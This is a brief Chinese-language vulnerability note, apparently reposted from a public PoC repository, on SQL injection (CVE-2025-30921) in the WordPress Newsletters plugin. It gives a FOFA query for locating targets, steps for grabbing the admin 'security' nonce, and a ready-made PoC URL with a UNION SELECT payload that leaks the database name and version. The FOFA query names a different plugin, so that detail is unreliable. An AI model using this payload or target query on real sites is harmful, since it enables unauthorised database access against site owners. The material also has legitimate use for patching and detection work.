## WordPress Newsletters Plugin存在SQL漏洞(CVE-2025-30921)

WordPress在Newsletters插件版本4.9.9.7或更低版本的插件仪表板中查看统计概览图表时/wp-admin/admin.php?page=newsletters，由于对URL参数的输入验证和转义处理不足，会发生SQL注入漏洞。

## fofa

```
body="/wp-content/plugins/web-directory-free"
```

## 前提条件和Administrator权限
使用浏览器开发者工具，action=wpmlwelcomestats&security=在“元素”选项卡中搜索 并检查 的值security。例如，如果搜索结果如下所示，请记下22b1ac0de6
```
jQuery.getJSON(newsletters_ajaxurl + 'action=wpmlwelcomestats&security=22b1ac0de6', ajaxdata, function(json) {
```
![image](https://github.com/user-attachments/assets/c82f3e9a-fd70-405f-b6d0-d9bd77622f76)

## poc
```javascript
http://localhost:8080/wp-admin/admin-ajax.php?action=wpmlwelcomestats&security=<SECURITY VALUE>&type=years&chart=bar&from=2024-12-31&to=2024-12-31&history_id=FOO%27+UNION+SELECT+(CONCAT((DATABASE()),%22-%22,(@@VERSION))),NULL+LIMIT+1,2+%23
```
![image](https://github.com/user-attachments/assets/c178862e-730b-4ba1-bce0-978b74cc0589)

## 漏洞来源
- https://github.com/DoTTak/CVE-2025-30921
